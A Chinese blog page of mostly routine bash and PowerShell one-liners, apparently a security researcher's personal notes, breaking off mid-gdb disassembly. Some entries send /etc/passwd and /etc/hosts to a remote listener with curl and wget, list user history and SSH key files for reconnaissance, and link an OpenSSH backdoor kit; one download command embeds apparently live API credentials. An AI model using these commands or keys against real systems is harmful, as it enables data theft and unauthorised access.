<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>bash常用代码 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="bash常用代码" />
<meta property="og:description" content="参考：
使用 Sublime 替换文本中的换行/回车符等特殊符号
searchsploit
openkeerp-cli
youtube
参考：
https://www.cnblogs.com/mfryf/p/3336288.html
网站文件批量下载 wget --no-check-certificate -i url.txt 文件上传 在某服务器下，没有scp等命令，或者在一个受限的shell里，如何通过curl命令将某目录的文件传输到另外一个服务器上。
接收方： nc -klvn 8888 &gt; file_receiv 传输方 # PUT curl http://ip:8888 -T /path/to/file # POST curl -F data=@/etc/passwd http://burp_server/curl_post # wget wget --post-file=/etc/hosts http://1.1.1.1:443 Ref:
使用 CURL 上传文件 监控系统命令 watch -n 3 -d &#39;ps aux|grep ping|grep -v grep&#39; Windows下载文件 Invoke-WebRequest &#34;https://ce.contrastsecurity.com/Contrast/api/ng/168bbadf-e988-4ab5-a9f4-ae5a74de2a6d/agents/default/JAVA&#34; -Method Get -ContentType &#34;application/json&#34; -Headers @{&#34;Authorization&#34;=&#34;NzdjYWlraWtpQGdtYWlsLmNvbTo2UlJMVkpUSzZOT0tTOVY0&#34;;&#34;API-Key&#34;=&#34;Lvch0rBXAkZ9dx7bPA614Y0YA5jKPHQl&#34;} -OutFile &#34;~/Downloads/contrast.jar&#34; 参考：
https://ce.contrastsecurity.com/Contrast/static/ng/index.html#/168bbadf-e988-4ab5-a9f4-ae5a74de2a6d/wizard/download/JAVA
Windows 打包/解压文件(powershell) #将文件或文件夹test压缩为test." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/43456d8cac5e9eb80a5074f1cd17e926/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-20T14:16:16+08:00" />
<meta property="article:modified_time" content="2023-10-20T14:16:16+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">bash常用代码</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-github-gist">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>参考：<br> <a href="https://www.jianshu.com/p/cdc1592b32c0" rel="nofollow">使用 Sublime 替换文本中的换行/回车符等特殊符号</a><br> <a href="https://github.com/offensive-security/exploit-database/blob/master/searchsploit">searchsploit</a><br> <a href="https://github.com/Eventide/openkeeper-cli">openkeerp-cli</a><br> <a href="https://www.youtube.com/watch?v=AedFlLSmJf8&amp;index=13&amp;list=PLh3suzD3w9hEuEv9WO_zIahqFfhHd8XPq" rel="nofollow">youtube</a><br> 参考：<br> https://www.cnblogs.com/mfryf/p/3336288.html</p> 
<h4><a id="_11"></a>网站文件批量下载</h4> 
<pre><code class="prism language-bash"><span class="token function">wget</span> --no-check-certificate <span class="token parameter variable">-i</span> url.txt
</code></pre> 
<h4><a id="_15"></a>文件上传</h4> 
<p>在某服务器下，没有scp等命令，或者在一个受限的shell里，如何通过curl命令将某目录的文件传输到另外一个服务器上。</p> 
<pre><code class="prism language-bash">接收方：
<span class="token function">nc</span> <span class="token parameter variable">-klvn</span> <span class="token number">8888</span> <span class="token operator">&gt;</span> file_receiv
传输方
<span class="token comment"># PUT</span>
<span class="token function">curl</span> http://ip:8888 <span class="token parameter variable">-T</span> /path/to/file
<span class="token comment"># POST</span>
<span class="token function">curl</span> <span class="token parameter variable">-F</span> <span class="token assign-left variable">data</span><span class="token operator">=</span>@/etc/passwd http://burp_server/curl_post

<span class="token comment"># wget</span>
<span class="token function">wget</span> --post-file<span class="token operator">=</span>/etc/hosts http://1.1.1.1:443
</code></pre> 
<p>Ref:</p> 
<ul><li><a href="https://www.gonever.com/post/45" rel="nofollow">使用 CURL 上传文件</a></li></ul> 
<h4><a id="_33"></a>监控系统命令</h4> 
<pre><code class="prism language-bash"><span class="token function">watch</span> <span class="token parameter variable">-n</span> <span class="token number">3</span> <span class="token parameter variable">-d</span> <span class="token string">'ps aux|grep ping|grep -v grep'</span>
</code></pre> 
<h4><a id="Windows_38"></a>Windows下载文件</h4> 
<pre><code class="prism language-powershell"><span class="token function">Invoke-WebRequest</span> <span class="token string">"https://ce.contrastsecurity.com/Contrast/api/ng/168bbadf-e988-4ab5-a9f4-ae5a74de2a6d/agents/default/JAVA"</span> <span class="token operator">-</span>Method Get <span class="token operator">-</span>ContentType <span class="token string">"application/json"</span> <span class="token operator">-</span>Headers @<span class="token punctuation">{<!-- --></span><span class="token string">"Authorization"</span>=<span class="token string">"NzdjYWlraWtpQGdtYWlsLmNvbTo2UlJMVkpUSzZOT0tTOVY0"</span><span class="token punctuation">;</span><span class="token string">"API-Key"</span>=<span class="token string">"Lvch0rBXAkZ9dx7bPA614Y0YA5jKPHQl"</span><span class="token punctuation">}</span> <span class="token operator">-</span>OutFile <span class="token string">"~/Downloads/contrast.jar"</span>
</code></pre> 
<p>参考：<br> https://ce.contrastsecurity.com/Contrast/static/ng/index.html#/168bbadf-e988-4ab5-a9f4-ae5a74de2a6d/wizard/download/JAVA</p> 
<h4><a id="Windows_powershell_47"></a>Windows 打包/解压文件(powershell)</h4> 
<pre><code class="prism language-powershell"><span class="token comment">#将文件或文件夹test压缩为test.zip</span>
powershell <span class="token function">Compress-Archive</span> <span class="token operator">-</span>Path D:\test <span class="token operator">-</span>DestinationPath E:\test<span class="token punctuation">.</span>zip

<span class="token comment">#将文件test.zip解压到test目录下</span>
powershell <span class="token function">Expand-Archive</span> <span class="token operator">-</span>Path E:\test<span class="token punctuation">.</span>zip <span class="token operator">-</span>DestinationPath F:\test
</code></pre> 
<p>参考：https://blog.csdn.net/u012611878/article/details/52492212</p> 
<h4><a id="_57"></a>快速判断指纹</h4> 
<pre><code class="prism language-bash"><span class="token keyword">while</span> <span class="token builtin class-name">read</span> dstip<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">curl</span> <span class="token parameter variable">-X</span> POST  <span class="token variable">$dstip</span>/run --connect-time <span class="token number">3</span>  --max-time <span class="token number">2</span>  <span class="token operator">&gt;&gt;</span> post.txt<span class="token punctuation">;</span>done<span class="token operator">&lt;</span><span class="token string">'ips.txt'</span>
</code></pre> 
<p>参考：https://juejin.im/post/6844904021535391752</p> 
<h4><a id="docker_63"></a>判断系统是否处在docker中</h4> 
<pre><code>cat /proc/1/cgroup
</code></pre> 
<p>参考：<br> https://www.adminxe.com/1201.html</p> 
<h4><a id="_69"></a>从文件读取信息进行批量操作</h4> 
<pre><code class="prism language-bash"><span class="token keyword">while</span> <span class="token builtin class-name">read</span> dstip<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">curl</span> <span class="token parameter variable">-I</span> <span class="token variable">$dstip</span><span class="token punctuation">;</span>done<span class="token operator">&lt;</span><span class="token string">'all_subdomain_result_20201106_173709.txt'</span>
</code></pre> 
<p>参考：https://www.cnblogs.com/iloveyoucc/archive/2012/07/10/2585529.html</p> 
<h4><a id="ab_75"></a>展示a文件中有，而b文件中没有的内容</h4> 
<pre><code class="prism language-bash"><span class="token function">cat</span> a.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">&gt;</span> a_u.txt  
<span class="token function">cat</span> b.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">&gt;</span> b_u.txt  
<span class="token function">comm</span> <span class="token parameter variable">-23</span>  a_u.txt  b_u.txt <span class="token operator">&gt;</span> c.txt  
</code></pre> 
<p>示例：</p> 
<pre><code class="prism language-bash">~$ <span class="token function">cat</span> abc.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">&gt;</span> a_u.txt 
~$ <span class="token function">cat</span> xyz.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">&gt;</span> x_u.txt 
~$ <span class="token function">comm</span> <span class="token parameter variable">-23</span>  a_u.txt  x_u.txt <span class="token operator">&gt;</span> uniq.txt
~$ <span class="token function">cat</span> uniq.txt 
<span class="token number">1</span>
<span class="token number">56</span>
<span class="token number">7</span>
~$ <span class="token function">vi</span> abc.txt
~$ <span class="token function">vi</span> xyz.txt
~$ <span class="token function">comm</span> <span class="token parameter variable">-23</span>  x_u.txt a_u.txt
<span class="token number">0</span>
<span class="token number">8</span>
<span class="token number">9</span>
~$ <span class="token function">cat</span> abc.txt
<span class="token number">1</span>
<span class="token number">2</span>
<span class="token number">34</span>
<span class="token number">56</span>
<span class="token number">7</span>
~$ <span class="token function">cat</span> xyz.txt
<span class="token number">2</span>
<span class="token number">34</span>
<span class="token number">8</span>
<span class="token number">9</span>
<span class="token number">0</span>

</code></pre> 
<p>参考：<br> https://blog.csdn.net/bigdatahappy/article/details/20625527</p> 
<h4><a id="_114"></a>查看某目录下所有文件和目录，按从大到小排序，且大小容易读</h4> 
<p>du这个命令比较慢：</p> 
<pre><code>du -csh *|sort -rh
</code></pre> 
<p>还可以使用ls</p> 
<pre><code>ls -lSh
</code></pre> 
<p>加r可以反向排序。<br> 但是并不会显示子目录下的文件的大小。看情况使用。</p> 
<h4><a id="pyteststmp_data_125"></a>查看当前目录及以下的所有*.py文件（不包含tests目录和tmp目录）中有<code>_data</code>字样的代码所在行</h4> 
<pre><code class="prism language-bash"><span class="token function">grep</span> <span class="token parameter variable">-rn</span> <span class="token string">"_data"</span> <span class="token variable"><span class="token variable">`</span><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">!</span> <span class="token parameter variable">-path</span> <span class="token string">'./tmp*'</span> <span class="token operator">!</span> <span class="token parameter variable">-path</span> <span class="token string">'./tests*'</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">"*.py$"</span><span class="token variable">`</span></span>
</code></pre> 
<p><img src="https://images2.imgbox.com/d9/88/JKevXin0_o.png" alt="在这里插入图片描述"><br> 参考：<br> https://www.cnblogs.com/drizzlewithwind/p/5705915.html</p> 
<h4><a id="bashrcsource_133"></a>解决.bashrc文件每次打开终端都需要source的问题</h4> 
<p>每次ssh登录进服务器的时候，发现需要手动source ~/.bashrc，<br> 如果没有~/bash_profile文件，则新建，然后添加以下代码：</p> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-f</span> .bashrc <span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">source</span> .bashrc 
<span class="token keyword">fi</span>
</code></pre> 
<p>参考：<br> https://www.jianshu.com/p/c4946024b946</p> 
<h4><a id="ASCIIhex_145"></a>ASCII转换为hex</h4> 
<p>如果不要求必须在一行，可以：</p> 
<pre><code class="prism language-bash"><span class="token function">cat</span> test.ser<span class="token operator">|</span>xxd <span class="token parameter variable">-p</span>
</code></pre> 
<p>如果希望内容在一行，用td删除掉换行符。</p> 
<pre><code class="prism language-bash"><span class="token function">cat</span> test.ser<span class="token operator">|</span>xxd -p<span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\n'</span> <span class="token operator">&gt;</span> poc.ser.txt
</code></pre> 
<p>参考：<br> https://stackoverflow.com/a/49903434</p> 
<h4><a id="Java_156"></a>Java项目的一般启动办法</h4> 
<p>找到Java的可执行文件的路径，设置好一些JVM参数，然后设置好启动的类，传入参数，然后使用<code>nohup &amp;</code>启动把进程放到后台，然后将输出写入到某log文件，加上<code>2&gt;&amp;1</code>把标准输出和标准错误都写到日志里。然后通过<code>echo $!</code>把最后运行的后台进程的PID写入到一个<code>.pid</code>文件中，到时候结束的时候，直接kill掉这个pid就可以了。</p> 
<pre><code class="prism language-bash"><span class="token function">nohup</span> <span class="token variable">$JAVA_BINARY</span> <span class="token variable">$JAVA_OPTS</span> <span class="token variable">$LAUNCHER</span> start <span class="token operator">&gt;&gt;</span> <span class="token variable">$BITBUCKET_HOME</span>/log/launcher.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$!</span> <span class="token operator">&gt;</span> <span class="token string">"<span class="token variable">$BITBUCKET_HOME</span>/log/bitbucket.pid"</span>
</code></pre> 
<p>参考Bitbucket的<code>bin/_start-webapp.sh</code>文件。</p> 
<p>若不存在某目录则创建该目录：</p> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$BITBUCKET_HOME</span>/log"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$BITBUCKET_HOME</span>/log"</span>
</code></pre> 
<p>想判断某个字符串是否包含某个pattern，可以用grep -q(表示即便匹配到也不打印到output，只用于判断是否匹配到)</p> 
<pre><code class="prism language-bash">➜  ~ <span class="token assign-left variable">UMASK</span><span class="token operator">=</span>0027
➜  ~ <span class="token builtin class-name">echo</span> <span class="token variable">$UMASK</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-qv</span> <span class="token string">'0[2367]7$'</span>
➜  ~ <span class="token builtin class-name">echo</span> <span class="token variable">$UMASK</span> <span class="token operator">|</span> <span class="token function">grep</span>  <span class="token string">'0[2367]7$'</span>
0027
</code></pre> 
<p>碰到不知道怎么关闭控制台输出的，加上这个：</p> 
<pre><code>&gt; /dev/null 2&gt;&amp;1
</code></pre> 
<p>将标准输出重定向到/dev/null ，对标准错误合并到标准输出里。<br> 比如：</p> 
<pre><code class="prism language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ~/Downloads/procyon-decompiler-0.5.34.jar atlassian-confluence-6.13.0/confluence/WEB-INF/atlassian-bundled-plugins/webdav-plugin-5.0.2.jar <span class="token parameter variable">-o</span> ~/Downloads/webdav-plugin-5.0.2  <span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre> 
<p>参考：https://blog.csdn.net/ithomer/article/details/9288353</p> 
<p>Ubuntu关机碰到：</p> 
<blockquote> 
 <p>A stop job is running for …</p> 
</blockquote> 
<p>可以执行以下命令：</p> 
<pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">vi</span> /etc/systemd/system.conf
</code></pre> 
<p>修改下面两个变量：</p> 
<pre><code class="prism language-bash"><span class="token assign-left variable">DefaultTimeoutStartSec</span><span class="token operator">=</span>10s
<span class="token assign-left variable">DefaultTimeoutStopSec</span><span class="token operator">=</span>10s
</code></pre> 
<p>然后</p> 
<pre><code class="prism language-bash">systemctl daemon-reload
</code></pre> 
<p>参考：https://blog.csdn.net/penge199761/article/details/79136826</p> 
<p>查找某目录下的某后缀结尾的文件：</p> 
<pre><code class="prism language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span>
</code></pre> 
<p>对某文件的内容通过：字符串进行分割，并输入第一列</p> 
<pre><code class="prism language-bash"><span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">":"</span> <span class="token string">'{print $1}'</span> <span class="token variable">$some_file</span>
</code></pre> 
<p>在文本中查找邮箱后缀：</p> 
<pre><code class="prism language-bash"><span class="token function">grep</span> <span class="token string">"@gmail.com"</span> *.txt <span class="token operator">|</span><span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">20</span>
</code></pre> 
<h4><a id="IP_221"></a>批量查看IP归属地</h4> 
<pre><code class="prism language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span>ip.txt<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">curl</span> https://ip.cn/<span class="token punctuation">\</span>?ip<span class="token punctuation">\</span><span class="token operator">=</span><span class="token variable">$line</span> <span class="token punctuation">;</span> <span class="token keyword">done</span>
</code></pre> 
<h4><a id="shell_bash_226"></a>shell bash判断文件或文件夹是否存在</h4> 
<p>https://www.cnblogs.com/emanlee/p/3583769.html</p> 
<h4><a id="Linux_shell_8_228"></a>Linux shell 截取字符变量的前8位</h4> 
<p>参考：https://886.iteye.com/blog/2311024<br> 1.expr substr “$a” 1 8<br> 2.echo $a|awk ‘{print substr(,1,8)}’<br> 3.echo $a|cut -c1-8</p> 
<h4><a id="git__233"></a>git 查看改变了哪些文件</h4> 
<pre><code class="prism language-bash"><span class="token function">git</span> whatchanged
</code></pre> 
<h4><a id="splunk_237"></a>splunk取消开机启动</h4> 
<pre><code>sudo /opt/splunk/bin/splunk disable boot-start
</code></pre> 
<h4><a id="splunk_241"></a>splunk关闭</h4> 
<pre><code>sudo /opt/splunk/bin/splunk stop
</code></pre> 
<h3><a id="nmap_245"></a>在线nmap扫描</h3> 
<p>https://hackertarget.com/tcp-port-scan/</p> 
<pre><code>curl "https://api.hackertarget.com/nmap/?q=gs.cqupt.edu.cn"
</code></pre> 
<p><img src="https://images2.imgbox.com/9c/ee/UZpXyS8q_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="vim_251"></a>vim全文替换</h3> 
<p>例如:</p> 
<pre><code class="prism language-bash">:%s/Twitter/GitHub/g
</code></pre> 
<p>会在全局范围(%)查找foo并替换为bar，所有出现都会被替换（g）。</p> 
<h3><a id="sed__258"></a>sed 全文替换</h3> 
<p>语法同vim，只是注意该转义的地方：</p> 
<pre><code class="prism language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/\# confluence.home=\/var\/data\/confluence\//confluence.home=\/home\/77\/confluenceHome5.8.15/g"</span> confluence/WEB-INF/classes/confluence-init.properties
</code></pre> 
<h3><a id="pingIP_264"></a>批量ping文件中的IP</h3> 
<pre><code class="prism language-bash"><span class="token keyword">while</span> <span class="token builtin class-name">read</span> dstip
<span class="token keyword">do</span>
    <span class="token keyword">if</span> <span class="token function">ping</span> <span class="token parameter variable">-c1</span> <span class="token variable">$dstip</span> <span class="token operator">&gt;</span> /dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$dstip</span> ping通"</span>
    <span class="token keyword">else</span>
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$dstip</span> ping不通"</span>
    <span class="token keyword">fi</span>
<span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token variable">$1</span>
</code></pre> 
<h3><a id="mysqlcms_277"></a>mysql为新cms创建数据库及帐号</h3> 
<pre><code class="prism language-bash"><span class="token variable">$cms</span><span class="token operator">=</span><span class="token string">"metinfo"</span>    <span class="token comment">#自行修改</span>
<span class="token builtin class-name">echo</span> <span class="token string">"create user '<span class="token variable">$cms</span>'@'localhost' identified by '<span class="token variable">$cms</span>'; create database '<span class="token variable">$cms</span>'; grant all privileges on '<span class="token variable">$cms</span>'.* to '<span class="token variable">$cms</span>'@localhost identified  by '<span class="token variable">$cms</span>'; flush privileges;"</span><span class="token punctuation">\</span>
<span class="token operator">|</span><span class="token function">sudo</span> mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span>
</code></pre> 
<h3><a id="Linuxgrep_284"></a>Linux下grep显示前后几行信息</h3> 
<p>标准unix/linux下的grep通过下面參数控制上下文</p> 
<p>参考：<br> https://mp.weixin.qq.com/s/hqyIO-lSJWgAHYhJ40J7Kg</p> 
<h3><a id="_289"></a>查看系统创建时间：</h3> 
<pre><code>sudo tune2fs -l /dev/sda1|grep created
</code></pre> 
<p>查看的时候注意与当前date的时间与实际时间的差别，通过这个来判断真实创建的时间。<br> <img src="https://images2.imgbox.com/5b/d1/yIK9SCnu_o.png" alt="在这里插入图片描述"><br> gcore dump之后，查看网络行为（只是搜索关键字？）</p> 
<pre><code>sudo gcore 867
cqq@ubuntu:~/repos$ file core.867 
core.867: ELF 64-bit LSB core file x86-64, version 1 (SYSV), SVR4-style, from 'nessusd'
cqq@ubuntu:~/repos$ strings -n 8 core.867|ag 'http:'
http://rfi.nessus.org/rfi.txt
http://www.kb.cert.org/vuls/id/
http://www.cert.org/advisories/
http://www.d2sec.com/exploits/

</code></pre> 
<p><img src="https://images2.imgbox.com/39/a4/fyNheipX_o.png" alt="在这里插入图片描述"><br> debian 下查看正在运行的服务</p> 
<pre><code>service --status-all | grep +
</code></pre> 
<p><img src="https://images2.imgbox.com/dd/e1/UMnKq13N_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="Centos_313"></a>Centos下查看正在运行的服务</h4> 
<pre><code>service  --status-all | grep "is running" 
</code></pre> 
<h4><a id="debian_317"></a>debian系发行版本</h4> 
<pre><code>cat /etc/lsb-release 或者lsb_release -a
cat /etc/redhat-release   查看    #rhel系发行版本
</code></pre> 
<h4><a id="_322"></a>查看可以登录的用户</h4> 
<pre><code>cat /etc/passwd|ag -v 'nologin$|false$'
</code></pre> 
<p><img src="https://images2.imgbox.com/0c/8a/F2LdU8U5_o.png" alt="在这里插入图片描述"></p> 
<pre><code>grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行
grep -B 5 foo file 显示foo及前5行
grep -A 5 foo file 显示foo及后5行
</code></pre> 
<p>查看与某端口相关的程序和网络连接。(注意要以sudo权限，否则可能看不到，而且没有提示)</p> 
<pre><code>sudo lsof -i:80
</code></pre> 
<p><img src="https://images2.imgbox.com/82/e7/PdSQ7dNh_o.png" alt="在这里插入图片描述"><br> 查看正在监听/已建立连接的TCP，仅IPv4。加+c 0的目的是显示完整进程名。</p> 
<pre><code>sudo lsof +c 0 -i 4TCP -nP |grep -E 'LISTEN|ESTABLISHED'
</code></pre> 
<p><img src="https://images2.imgbox.com/05/60/46bWO8GL_o.png" alt="在这里插入图片描述"><br> 查看某目录下各个文件的各自大小。</p> 
<pre><code>df -h
</code></pre> 
<p>如文件太多，不建议使用此命令。<br> <img src="https://images2.imgbox.com/92/f9/wJdeNaHJ_o.png" alt="在这里插入图片描述"><br> 查看某目录下总共有多大：</p> 
<pre><code>du -csh
</code></pre> 
<p><img src="https://images2.imgbox.com/9b/0b/NBxXV7ep_o.png" alt="在这里插入图片描述"></p> 
<p>批量重命名</p> 
<pre><code>rename 's/ /_/g' *
</code></pre> 
<p>批量删除括号里面没有的内容</p> 
<pre><code>rm !(*.foo|*.bar|*.baz)
</code></pre> 
<p>查看用户信息</p> 
<pre><code>#如果安装了zsh也可以看看~/.zshrc 
cat ~/.bash_history
cat ~/.nano_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.bashrc
cat ~/.profile
cat ~/.ssh/authorized_keys
cat /etc/profile
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
</code></pre> 
<p>根据/var/log/auth.log查看ssh登陆ip</p> 
<pre><code>ag -a accepted /var/log/auth.*|ag -o '\d+\.\d+\.\d+\.\d+'|sort|uniq
</code></pre> 
<p><img src="https://images2.imgbox.com/31/7c/5i77Dgtr_o.png" alt="在这里插入图片描述"><br> 查看文件信息 stat <br> <img src="https://images2.imgbox.com/b2/cd/uvt6SY9M_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="OpenSSH_67p1_backdoor_387"></a>OpenSSH 6.7p1 backdoor</h4> 
<p>https://github.com/jivoi/openssh-backdoor-kit/</p> 
<h3><a id="Windows_389"></a>Windows平台将输出结果复制到粘贴板</h3> 
<p>只需要<code>|clip</code>即可。</p> 
<pre><code>netstat -ano|findstr 445|clip
</code></pre> 
<h3><a id="IP_394"></a>查看默认出口网卡的IP</h3> 
<pre><code>ip route | grep default
</code></pre> 
<h3><a id="zip_399"></a>zip打包隐藏目录文件</h3> 
<pre><code>zip -r demohour_com.zip * .[^.]*

# 说明：
# -r 递归子目录
# * 所有非隐藏文件/夹
# .[^.]*（所有隐藏文件/夹，但排除..（上一级目录））
</code></pre> 
<p>来源：http://www.redicecn.com/html/Linux/20131125/467.html</p> 
<h3><a id="gdbinterflavor_410"></a>gdb开启inter的flavor</h3> 
<pre><code class="prism language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">"set disassembly-flavor intel"</span> <span class="token operator">&gt;</span> ~/.gdbinit
$ gdb ./x
<span class="token punctuation">..</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disas main
Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main:
   0x0000000000400637 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:	push   rbp
   0x0000000000400638 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:	mov    rbp,rsp
   0x000000000040063b <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:	sub    rsp,0x30
   0x000000000040063f <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x24<span class="token punctuation">]</span>,edi
   0x0000000000400642 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:	mov    QWORD PTR <span class="token punctuation">[</span>rbp-0x30<span class="token punctuation">]</span>,rsi
   0x0000000000400646 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040064f <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:	mov    QWORD PTR <span class="token punctuation">[</span>rbp-0x8<span class="token punctuation">]</span>,rax
   0x0000000000400653 <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	xor    eax,eax
   0x0000000000400655 <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:	mov    rax,QWORD PTR <span class="token punctuation">[</span>rbp-0x30<span class="token punctuation">]</span>
   0x0000000000400659 <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:	<span class="token function">add</span>    rax,0x8
   0x000000000040065d <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	mov    rdx,QWORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>
   0x0000000000400660 <span class="token operator">&lt;</span>+4<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:	lea    rax,<span class="token punctuation">[</span>rbp-0x20<span class="token punctuation">]</span>
   0x0000000000400664 <span class="token operator">&lt;</span>+4<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span>:	mov    rsi,rdx
   0x0000000000400667 <span class="token operator">&lt;</span>+4<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	mov    rdi,rax
   0x000000000040066a <span class="token operator">&lt;</span>+5<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:	call   0x4004d0 <span class="token operator">&lt;</span>strcpy@plt<span class="token operator">&gt;</span>
   0x000000000040066f <span class="token operator">&lt;</span>+5<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:	lea    rax,<span class="token punctuation">[</span>rbp-0x20<span class="token punctuation">]</span>
   0x0000000000400673 <span class="token operator">&lt;</span>+6<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:	mov    rsi,rax
   0x0000000000400676 <span class="token operator">&lt;</span>+6<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>:	mov    edi,0x40072c
   0x000000000040067b <span class="token operator">&lt;</span>+6<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	mov    eax,0x0
   0x0000000000400680 <span class="token operator">&lt;</span>+7<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>:	call   0x400500 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
   0x0000000000400685 <span class="token operator">&lt;</span>+7<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	mov    eax,0x0
   0x000000000040068a <span class="token operator">&lt;</span>+8<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>:	mov    rcx,QWORD PTR <span class="token punctuation">[</span>rbp-0x8<span class="token punctuation">]</span>
